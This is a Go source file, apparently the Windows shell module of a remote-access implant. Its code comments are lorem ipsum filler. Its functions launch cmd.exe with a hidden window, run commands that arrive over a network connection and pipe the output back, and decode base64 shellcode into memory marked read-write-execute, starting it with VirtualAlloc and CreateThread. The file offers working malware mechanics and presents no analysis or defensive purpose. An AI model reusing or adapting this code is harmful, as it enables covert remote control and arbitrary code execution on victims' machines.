//  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 

package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
)

// G Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
func ExecuteCmd(command string, conn net.Conn) {
	//cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

//  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

//  Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	// LOLZ
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// LOLZWUT
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	procCreateThread.Call(0, 0, address, 0, 0, 0)
}
